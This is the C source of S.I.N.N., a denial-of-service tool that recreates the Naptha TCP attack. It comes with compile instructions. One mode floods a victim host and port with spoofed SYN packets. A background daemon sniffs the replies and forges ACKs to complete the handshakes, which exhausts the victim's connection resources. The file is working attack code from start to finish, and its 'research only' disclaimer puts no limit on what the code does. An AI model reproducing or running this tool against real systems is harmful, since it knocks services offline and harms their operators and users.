/*  S.I.N.N. - Sinn Is Not Naphta
 *
 * By Bruno Morisson <morisson@genhex.org>
 *       http://www.genhex.org
 *
 * DISCLAIMER:
 *  S.I.N.N. is a research DoS tool. It was coded based
 * on the very little info on a DoS attack described by
 * a BindView advisory, at
 * http://razor.bindview.com/publish/advisories/adv_NAPTHA.html
 *  This Software is provided AS IS, with NO WARRANTY,
 * WHATSOEVER! You use it at your own risk. I take no
 * responsability for whatever you use this for. It may
 * not work, it may destroy your computer, it may destroy
 * others' computers, it may put you in jail,
 * it may kill you, it may make your hair fall.
 * You have been warned. By using
 * this software you agree to use it ONLY for research
 * purposes, and on your own risk.
 *
 *
 * To compile:
 *  build the packet injector:
 *   cc `libnet-config --defines` -o sinn sinn.c `libnet-config --libs`
 *  then build the packet reply daemon:
 *   cc `libnet-config --defines` -D_DAEMON_ -o sinnd sinn.c -lpcap \
 *    `libnet-config --libs`
 *
 */

#include <pcap.h>
#include <libnet.h>
#include <signal.h>


int inject(int sock, u_long src_ip, u_long dst_ip,
           u_short src_prt, u_short dst_prt,u_long id,
           u_long seq, u_long ack, u_char flags) {

  int packet_size;
  u_char *packet;

  packet_size = LIBNET_IP_H + LIBNET_TCP_H;

  libnet_init_packet(packet_size, &packet);

  if(!packet)
    libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");

  libnet_build_ip(LIBNET_TCP_H, IPTOS_LOWDELAY,
            id, 0, 1, IPPROTO_TCP, src_ip, dst_ip,
            NULL, 0, packet);

    libnet_build_tcp(src_prt, dst_prt, seq, ack,
            flags, 512, 0, NULL, 0, packet + LIBNET_IP_H);


  libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H);
  libnet_write_ip(sock, packet, packet_size);
  libnet_destroy_packet(&packet);
}


#ifdef _DAEMON_
void pcap(char *iface,u_long source, u_long dest, u_short dport){

  int sock;
  struct pcap_pkthdr *hdr;
  char errbuf[PCAP_ERRBUF_SIZE];
  u_char *pacote;
  struct libnet_ip_hdr  *ip;
  struct libnet_tcp_hdr *tcp;
  pcap_t *descritor;
  u_long id, seq ,ack;
  u_short port;
  u_char flags;

  pacote= (u_char *)malloc(3000);
  hdr = (struct pcap_pkthdr *)malloc(sizeof(struct pcap_pkthdr));
  descritor = pcap_open_live(iface,1500,1,0,errbuf);

  if((sock = libnet_open_raw_sock(IPPROTO_RAW))==-1)
      libnet_error(LIBNET_ERR_FATAL, "Error opening socket.\n");

  do{
    pacote = (u_char *)pcap_next(descritor,hdr);
    if(pacote!=NULL) {
      ip=(struct libnet_ip_hdr *)(pacote+LIBNET_ETH_H);
      tcp=(struct libnet_tcp_hdr *)(pacote+LIBNET_IP_H+LIBNET_ETH_H);


if((ip->ip_src.s_addr==dest)&&(tcp->th_sport==htons(dport))&&((tcp->th_flags==(TH_SYN|TH_ACK)))) {
       id=ntohl(ip->ip_id);
       seq=ntohl(tcp->th_ack);
       ack=ntohl(tcp->th_seq)+1;
       flags=TH_ACK;
       inject(sock,ip->ip_dst.s_addr,ip->ip_src.s_addr,
              ntohs(tcp->th_dport),ntohs(tcp->th_sport),
              id,seq,ack,flags);
      }
    }
  } while(1);
  free(hdr);

}



int main(int argc, char **argv) {

 u_long src_ip, dst_ip;
 u_short dst_prt;

 if(argc<5) {
  fprintf(stderr,"usage: %s <src ip> <victim ip> <victim port>
<iface>\n",argv[0]);
  exit(-1);
 }


 src_ip=inet_addr(argv[1]);
 dst_ip=inet_addr(argv[2]);
 dst_prt=atoi(argv[3]);


 signal(SIGCHLD,SIG_IGN);
 close(STDIN_FILENO);
 close(STDOUT_FILENO);
 close(STDERR_FILENO);

 if(!fork())
   pcap(argv[4],src_ip,dst_ip, dst_prt);

 exit(0);
}


#else
int main(int argc, char **argv) {

 int sock;
 u_long src_ip, dst_ip;
 u_short src_prt, dst_prt;
 u_long id=666,seq=100,ack=0;
 u_long counter=0;
 int packets=0;
 pid_t pid;

 if(argc<6) {
  fprintf(stderr,"usage: %s <src ip> <src port> <victim ip> <victim port>
<connections>\n",argv[0]);
  exit(-1);
 }

 src_ip=inet_addr(argv[1]);
 src_prt=atoi(argv[2]);
 dst_ip=inet_addr(argv[3]);
 dst_prt=atoi(argv[4]);
 packets=atoi(argv[5]);

 printf("Creating %d connections\n",packets);

 if((sock = libnet_open_raw_sock(IPPROTO_RAW))==-1)
   libnet_error(LIBNET_ERR_FATAL, "Error opening socket.\n");


 while(packets--) {
   inject(sock,src_ip,dst_ip,src_prt++,
     dst_prt,id++,seq++,0,TH_SYN);
   printf("%d ",counter++);
   fflush(stdout);
   sleep(1);
 }

 libnet_close_raw_sock(sock);
 sleep(2);
}
#endif


